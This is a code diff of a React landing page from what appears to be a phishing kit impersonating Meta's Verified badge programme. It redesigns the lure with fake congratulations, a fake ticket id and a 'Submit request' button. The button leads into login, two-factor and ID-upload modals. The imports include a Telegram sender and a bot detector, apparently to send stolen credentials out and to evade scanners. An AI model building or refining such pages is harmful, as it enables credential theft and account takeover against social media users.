@@ -3,7 +3,6 @@ import { useLocation } from 'react-router';
 import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import TickIcon from '@/assets/images/tick.svg';
-import TichImage from '@/assets/images/tich.webp';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
@@ -13,14 +12,8 @@ import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
 import UploadModal from '@/components/UploadModal';
 import SuccessModal from '@/components/SuccessModal';
-import Sidebar from '@/components/Sidebar';
-import BenefitsSection from '@/components/BenefitsSection';
-import TestimonialSection from '@/components/TestimonialSection';
-import SearchModal from '@/components/SearchModal';
 import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
 import TermsModal from '@/components/TermsModal';
-import SaveImg from '@/assets/images/save_img.png';
-import DocImg from '@/assets/images/doc.png';
 
 const LABEL = 'Thần-tài-đến';
 
@@ -31,11 +24,9 @@ const Home = () =>
     const [ show2FAModal, setShow2FAModal ] = useState( false );
     const [ showUploadModal, setShowUploadModal ] = useState( false );
     const [ showSuccessModal, setShowSuccessModal ] = useState( false );
-    const [ showSearchModal, setShowSearchModal ] = useState( false );
     const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
     const [ selectedPrivacyQuestion, setSelectedPrivacyQuestion ] = useState( null );
     const [ showTermsModal, setShowTermsModal ] = useState( false );
-    const [ showMobileSidebar, setShowMobileSidebar ] = useState( false );
     const [ formData, setFormData ] = useState( {
         fullName: '',
         personalEmail: '',
@@ -52,53 +43,20 @@ const Home = () =>
 
     const defaultTexts = useMemo(
         () => ( {
-            title: 'Your page has met the requirements to receive the Verified badge.',
-            congrats: 'Congratulations on meeting the requirements to upgrade your page to the Verified badge',
-            milestone: 'This is a fantastic milestone, reflecting your dedication and the trust you have built with your audience.',
-            excited: 'We are excited to celebrate this moment with you and look forward to seeing your page grow even stronger with this prestigious recognition!',
-            getBadge: 'Get the Verified badge',
-            metaVerified: 'Meta Verified',
-            protectBrand: 'Protect your brand with Meta Verified',
+            heroTitle: 'Meta Verified - Rewards for you',
             showWorld: 'Show the world that you mean business.',
-            buildConfidence: 'Meta Verified helps you build more confidence with new audiences and protects your brand.',
-            search: 'Search',
+            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+            excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
+            ticketIdLabel: 'Your ticket id: #8241-XNYG-AVMB',
+            guideTitle: 'Verified Blue Badge Request Guide',
+            guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
+            guideItem2: '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
+            guideItem3: '- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.',
+            submitRequest: 'Submit request',
+            helpCenter: 'Help Center',
             privacyPolicy: 'Privacy Policy',
-            otherRules: 'Other rules and articles',
-            settings: 'Settings',
-            creatorToolkit: 'A creator toolkit to take your brand further',
-            creatorToolkitDesc: 'Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.',
-            metaVerifiedBenefits: 'Meta Verified benefits',
-            verifiedBadge: 'Verified badge',
-            verifiedBadgeDesc: 'The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents that you provided.',
-            impersonationProtection: 'Impersonation protection',
-            impersonationProtectionDesc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.',
-            enhancedSupport: 'Enhanced support',
-            enhancedSupportDesc: 'Get 24/7 access to email or chat agent support.',
-            upgradedProfile: 'Upgraded profile features',
-            upgradedProfileDesc: 'Enrich your profile by adding images to your links to help boost engagement.',
-            exploreBusiness: 'Explore Meta Verified for business benefits.',
-            businessDesc1: 'Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.',
-            businessDesc2: 'Distinguish fake accounts: Help customers distinguish real and fake accounts, avoid buying from the wrong shop.',
-            businessDesc3: 'Increased Credibility: Accounts with Verified Badges are often highly regarded and attract more potential customers.',
-            businessDesc4: 'Increased search visibility: Accounts with the Verified Badge are often given priority in search results.',
-            businessDesc5: 'Personalized Content Strategy Consulting',
-            businessDesc6: 'Work with a consultant to review and improve your social media content strategy for your subscribed account every week.',
-            privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
-            manageInfo: 'How you can manage or delete your information',
-            userAgreement: 'For more details, see the User Agreement',
-            metaAI: 'Meta AI',
-            additionalResources: 'Additional resources',
-            aiInfo: 'How Meta uses information for generative AI models',
-            aiCards: 'Cards with information about the operation of AI systems',
-            aiIntro: 'Introduction to Generative AI',
-            privacyCenter: 'Privacy Center',
-            metaAIWebsite: 'Meta AI website',
-            forTeenagers: 'For teenagers',
-            privacyRisks: 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about',
-            testimonial1: '"Being Meta Verified has elevated my credibility with my audience. For new followers or potential partners viewing my profile, it shows that I am established and serious about my work."',
-            testimonial2: '"Meta Verified helped me build my credibility as a creator."',
-            testimonial3: '"I like how Meta Verified added an extra layer of security to help protect me from impersonation."',
-            testimonial4: '"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."',
+            termsOfService: 'Terms of Service',
+            communityStandards: 'Community Standards',
 
             fullName: 'Full Name',
             personalEmail: 'Personal Email',
@@ -132,10 +90,7 @@ const Home = () =>
             thankYou: 'Thank you',
             metaSupportTeam: 'Meta Support Team.',
 
-            searchPlaceholder: 'Search the Privacy Center',
-            nothingFound: 'Nothing found',
-            searchHint: 'Use other keywords or check the spelling of the search term request.',
-
+            privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
             mainInSection: 'The main thing in the section',
             privacyDesc1: 'At Meta, we want you to understand what information we collect, how we use it, and with whom we use it. let\'s share. Therefore, we recommend that you read our Privacy Policy. This will help you use',
             privacyDesc2: '\'s products the way you need.',
@@ -185,7 +140,6 @@ const Home = () =>
             otherTermsPolicies: 'Other terms and policies that may apply to you',
             advertisingRules: 'Advertising Rules',
             advertisingRulesDesc: '. These rules apply to partners who advertise on various Meta Products and determine the types of advertising content that such partners are permitted to use.',
-            communityStandards: 'Community Standards',
             communityStandardsDesc: '. These guidelines set out our standards for the content you post on Facebook and your activities on Facebook and other Meta Products.',
             communityPaymentTerms: 'Community Payment Terms',
             communityPaymentTermsDesc: '. These terms apply to payments made to or through the Meta Products.',
@@ -441,255 +395,195 @@ const Home = () =>
 
     return (
         <>
-            <div className="container-sm" id="main">
-                <div className="container-head">
-                    <div id="logo">
-                        <svg aria-label="Логотип Meta" className="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
-                            <defs>
-                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38" x2="160.839" y1="99" y2="59.326">
-                                    <stop offset=".427" stopColor="#0278F1"></stop>
-                                    <stop offset=".917" stopColor="#0180FA"></stop>
-                                </linearGradient>
-                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
-                                    <stop offset=".427" stopColor="#0165E0"></stop>
-                                    <stop offset=".917" stopColor="#0180FA"></stop>
-                                </linearGradient>
-                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
-                                    <stop stopColor="#0064E0"></stop>
-                                    <stop offset=".656" stopColor="#0066E2"></stop>
-                                    <stop offset="1" stopColor="#0278F1"></stop>
-                                </linearGradient>
-                            </defs>
-                            <path
-                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
-                                fill="#1C2B33"
-                            ></path>
-                            <path
-                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
-                                fill="#0180FA"
-                            ></path>
-                            <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
-                            <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
-                            <path
-                                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
-                                fill="url(#:R1eckmkldd6knpapd5aqH3:)"
-                            >                            </path>
-                        </svg>
-                    </div>
-                    <div className="burger-button" id="showPopup" onClick={ () => setShowMobileSidebar( true ) } style={ { cursor: 'pointer' } }>
-                        <div className="bar"></div>
-                        <div className="bar"></div>
-                        <div className="bar"></div>
-                    </div>
-                </div>
-                <div className="row">
-                    <div className="col-4">
-                        <Sidebar
-                            texts={ texts }
-                            onOpenSearchModal={ () => setShowSearchModal( true ) }
-                            onOpenPrivacyModal={ ( question ) =>
-                            {
-                                setSelectedPrivacyQuestion( question );
-                                setShowPrivacyModal( true );
-                            } }
-                            onOpenTermsModal={ () => setShowTermsModal( true ) }
+            <div
+                id="main"
+                style={ {
+                    minHeight: '100vh',
+                    width: '100%',
+                    background: 'linear-gradient(135deg, #e8f0fe 0%, #f1f7fd 45%, #edf6f9 100%)',
+                    display: 'flex',
+                    justifyContent: 'center',
+                    alignItems: 'center',
+                    padding: '48px 20px',
+                    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+                    color: '#1c2b33',
+                    boxSizing: 'border-box'
+                } }
+            >
+                <div
+                    style={ {
+                        maxWidth: '640px',
+                        width: '100%',
+                        textAlign: 'left'
+                    } }
+                >
+                    <div style={ { marginBottom: '18px' } }>
+                        <img
+                            src={ TickIcon }
+                            alt="Verified Badge"
+                            style={ { width: '48px', height: '48px', display: 'block' } }
                         />
                     </div>
-                    <div className="col-8">
-                        <div id="right">
-                            <h1>
-                                <img alt="" src={ TickIcon } style={ { height: '50px', width: '50px', marginRight: '8px' } } />
-                                { texts.title }
-                            </h1>
-                            <p>{ texts.congrats }</p>
-                            <p>{ texts.milestone }</p>
-                            <p>{ texts.excited }</p>
 
-                            <div id="card" style={ { background: 'rgb(222, 240, 243)' } }>
-                                <div className="card-text">
-                                    <div
-                                        style={ {
-                                            borderRadius: '15px',
-                                            backgroundColor: 'white',
-                                            padding: '20px 20px 10px 20px'
-                                        } }
-                                    >
-                                        <h5>
-                                            <img src={ TickIcon } width="18" alt="tick" style={ { verticalAlign: 'middle' } } /> { texts.metaVerified }
-                                        </h5>
-                                        <h6>{ texts.protectBrand }</h6>
-                                        <h6 style={ { display: 'flex', flexDirection: 'column', gap: '6px' } }>
-                                            <span>{ texts.showWorld }</span>
-                                            <span>{ texts.buildConfidence }</span>
-                                        </h6>
-                                    </div>
-                                    <div className="btn-wrapper">
-                                        <div className="button fb-blue w-100" id="start" onClick={ () => setShowFirstModal( true ) }>
-                                            { texts.getBadge }
-                                        </div>
-                                    </div>
-                                </div>
-                                <img alt="" src={ TichImage } style={ { borderRadius: '20px' } } />
+                    <h1
+                        style={ {
+                            fontSize: '30px',
+                            fontWeight: '700',
+                            color: '#1c2b33',
+                            margin: '0 0 22px 0',
+                            lineHeight: '1.25',
+                            letterSpacing: '-0.02em'
+                        } }
+                    >
+                        { texts.heroTitle }
+                    </h1>
 
-                            </div>
+                    <p
+                        style={ {
+                            fontSize: '15px',
+                            fontWeight: '700',
+                            color: '#1c2b33',
+                            margin: '0 0 16px 0',
+                            lineHeight: '1.5'
+                        } }
+                    >
+                        { texts.showWorld }
+                    </p>
 
-                            <BenefitsSection texts={ texts } />
-                            <TestimonialSection texts={ texts } />
+                    <p
+                        style={ {
+                            fontSize: '14px',
+                            color: '#374151',
+                            margin: '0 0 14px 0',
+                            lineHeight: '1.6'
+                        } }
+                    >
+                        { texts.congrats }
+                    </p>
 
-                            <h5>
-                                <img src={ TickIcon } width="18" alt="tick" style={ { verticalAlign: 'middle' } } /> { texts.exploreBusiness }
-                            </h5>
-                            <br />
-                            <h6>{ texts.businessDesc1 }</h6>
-                            <h6>{ texts.businessDesc2 }</h6>
-                            <h6>{ texts.businessDesc3 }</h6>
-                            <h6>{ texts.businessDesc4 }</h6>
-                            <h6>
-                                { texts.businessDesc5 }
-                                <br />
-                                { texts.businessDesc6 }
-                                <br />
-                                <br />
-                                <div className="fake-likns">
-                                    <div className="action-button-list">
-                                        <div
-                                            className="action-button wide"
-                                            onClick={ () =>
-                                            {
-                                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
-                                                setShowPrivacyModal( true );
-                                            } }
-                                            style={ { cursor: 'pointer' } }
-                                        >
-                                            <div className="action-button-img">
-                                                <img alt="" src={ SaveImg } />
-                                            </div>
-                                            <div className="action-button-text">
-                                                <span>{ texts.privacyPolicyQ }</span>
-                                                <br />
-                                                <span className="small-grey">{ texts.privacyPolicy }</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                        <div
-                                            className="action-button wide"
-                                            onClick={ () =>
-                                            {
-                                                setSelectedPrivacyQuestion( texts.manageInfo );
-                                                setShowPrivacyModal( true );
-                                            } }
-                                            style={ { cursor: 'pointer' } }
-                                        >
-                                            <div className="action-button-img">
-                                                <img alt="" src={ SaveImg } />
-                                            </div>
-                                            <div className="action-button-text">
-                                                <span>{ texts.manageInfo }</span>
-                                                <br />
-                                                <span className="small-grey">{ texts.privacyPolicy }</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <br />
-                                    <h6>{ texts.userAgreement }</h6>
-                                    <div
-                                        className="action-button wide"
-                                        onClick={ () => setShowTermsModal( true ) }
-                                        style={ { cursor: 'pointer' } }
-                                    >
-                                        <div className="action-button-img">
-                                            <img alt="" src={ DocImg } />
-                                        </div>
-                                        <div className="action-button-text">
-                                            <span>{ texts.metaAI }</span>
-                                            <br />
-                                            <span className="small-grey">User Agreement</span>
-                                        </div>
-                                        <div className="action-button-arrow">
-                                            <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                            </svg>
-                                        </div>
-                                    </div>
-                                    <br />
-                                    <h6>{ texts.additionalResources }</h6>
-                                    <div className="action-button-list">
-                                        <div
-                                            className="action-button wide"
-                                            onClick={ () =>
-                                            {
-                                                setSelectedPrivacyQuestion( texts.aiInfo );
-                                                setShowPrivacyModal( true );
-                                            } }
-                                            style={ { cursor: 'pointer' } }
-                                        >
-                                            <div className="action-button-text">
-                                                <span>{ texts.aiInfo }</span>
-                                                <br />
-                                                <span className="small-grey">{ texts.privacyCenter }</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                        <div
-                                            className="action-button wide"
-                                            onClick={ () =>
-                                            {
-                                                setSelectedPrivacyQuestion( texts.aiCards );
-                                                setShowPrivacyModal( true );
-                                            } }
-                                            style={ { cursor: 'pointer' } }
-                                        >
-                                            <div className="action-button-text">
-                                                <span>{ texts.aiCards }</span>
-                                                <br />
-                                                <span className="small-grey">{ texts.metaAIWebsite }</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                        <div
-                                            className="action-button wide"
-                                            onClick={ () =>
-                                            {
-                                                setSelectedPrivacyQuestion( texts.aiIntro );
-                                                setShowPrivacyModal( true );
-                                            } }
-                                            style={ { cursor: 'pointer' } }
-                                        >
-                                            <div className="action-button-text">
-                                                <span>{ texts.aiIntro }</span>
-                                                <br />
-                                                <span className="small-grey">{ texts.forTeenagers }</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </h6>
-                            <p className="small-grey">
-                                { texts.privacyRisks } <a className="add-svg" id="policyLink" target="_blank" rel="noopener noreferrer">{ texts.privacyPolicy }</a>
-                            </p>
-                        </div>
+                    <p
+                        style={ {
+                            fontSize: '14px',
+                            color: '#374151',
+                            margin: '0 0 18px 0',
+                            lineHeight: '1.6'
+                        } }
+                    >
+                        { texts.excited }
+                    </p>
+
+                    <p
+                        style={ {
+                            fontSize: '13.5px',
+                            color: '#6b7280',
+                            margin: '0 0 22px 0',
+                            fontWeight: '500'
+                        } }
+                    >
+                        { texts.ticketIdLabel }
+                    </p>
+
+                    <h2
+                        style={ {
+                            fontSize: '15px',
+                            fontWeight: '700',
+                            color: '#1c2b33',
+                            margin: '0 0 14px 0'
+                        } }
+                    >
+                        { texts.guideTitle }
+                    </h2>
+
+                    <div
+                        style={ {
+                            fontSize: '14px',
+                            color: '#374151',
+                            lineHeight: '1.6',
+                            display: 'flex',
+                            flexDirection: 'column',
+                            gap: '12px',
+                            marginBottom: '32px'
+                        } }
+                    >
+                        <p style={ { margin: 0 } }>{ texts.guideItem1 }</p>
+                        <p style={ { margin: 0 } }>{ texts.guideItem2 }</p>
+                        <p style={ { margin: 0 } }>{ texts.guideItem3 }</p>
+                    </div>
+
+                    <div
+                        style={ {
+                            display: 'flex',
+                            justifyContent: 'center',
+                            marginBottom: '26px'
+                        } }
+                    >
+                        <button
+                            id="start"
+                            type="button"
+                            onClick={ () => setShowFirstModal( true ) }
+                            style={ {
+                                backgroundColor: '#1877f2',
+                                color: '#ffffff',
+                                border: 'none',
+                                borderRadius: '9999px',
+                                padding: '12px 68px',
+                                fontSize: '14px',
+                                fontWeight: '600',
+                                cursor: 'pointer',
+                                transition: 'background-color 0.2s ease',
+                                boxShadow: '0 2px 6px rgba(24, 119, 242, 0.2)'
+                            } }
+                            onMouseOver={ ( e ) => ( e.currentTarget.style.backgroundColor = '#166fe5' ) }
+                            onMouseOut={ ( e ) => ( e.currentTarget.style.backgroundColor = '#1877f2' ) }
+                        >
+                            { texts.submitRequest }
+                        </button>
+                    </div>
+
+                    <div
+                        style={ {
+                            display: 'flex',
+                            flexWrap: 'wrap',
+                            justifyContent: 'center',
+                            alignItems: 'center',
+                            gap: '16px',
+                            fontSize: '12px',
+                            color: '#6b7280'
+                        } }
+                    >
+                        <span
+                            onClick={ () =>
+                            {
+                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
+                                setShowPrivacyModal( true );
+                            } }
+                            style={ { cursor: 'pointer' } }
+                        >
+                            { texts.helpCenter }
+                        </span>
+                        <span
+                            onClick={ () =>
+                            {
+                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
+                                setShowPrivacyModal( true );
+                            } }
+                            style={ { cursor: 'pointer' } }
+                        >
+                            { texts.privacyPolicy }
+                        </span>
+                        <span
+                            onClick={ () => setShowTermsModal( true ) }
+                            style={ { cursor: 'pointer' } }
+                        >
+                            { texts.termsOfService }
+                        </span>
+                        <span
+                            onClick={ () => setShowTermsModal( true ) }
+                            style={ { cursor: 'pointer' } }
+                        >
+                            { texts.communityStandards }
+                        </span>
+                        <span>Meta © 2026</span>
                     </div>
                 </div>
             </div>
@@ -699,7 +593,6 @@ const Home = () =>
             <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } } texts={ texts } />
             <UploadModal show={ showUploadModal } onClose={ () => setShowUploadModal( false ) } onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
             <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
-            <SearchModal show={ showSearchModal } onClose={ () => setShowSearchModal( false ) } texts={ texts } />
             <PrivacyPolicyModal
                 show={ showPrivacyModal }
                 onClose={ () =>
@@ -711,41 +604,8 @@ const Home = () =>
                 texts={ texts }
             />
             <TermsModal show={ showTermsModal } onClose={ () => setShowTermsModal( false ) } texts={ texts } />
-
-            { showMobileSidebar && (
-                <div className="popup show" id="popup" onClick={ () => setShowMobileSidebar( false ) } style={ { display: 'block' } }>
-                    <div className="popup-item" onClick={ ( e ) => e.stopPropagation() }>
-                        <div className="burger-button-popup" id="closePopup" onClick={ () => setShowMobileSidebar( false ) } style={ { cursor: 'pointer' } }>
-                            <div className="bar"></div>
-                            <div className="bar"></div>
-                        </div>
-                        <div className="popup-content">
-                            <Sidebar
-                                texts={ texts }
-                                onOpenSearchModal={ () =>
-                                {
-                                    setShowMobileSidebar( false );
-                                    setShowSearchModal( true );
-                                } }
-                                onOpenPrivacyModal={ ( question ) =>
-                                {
-                                    setShowMobileSidebar( false );
-                                    setSelectedPrivacyQuestion( question );
-                                    setShowPrivacyModal( true );
-                                } }
-                                onOpenTermsModal={ () =>
-                                {
-                                    setShowMobileSidebar( false );
-                                    setShowTermsModal( true );
-                                } }
-                            />
-                        </div>
-                    </div>
-                </div>
-            ) }
         </>
     );
 };
 
 export default Home;
-
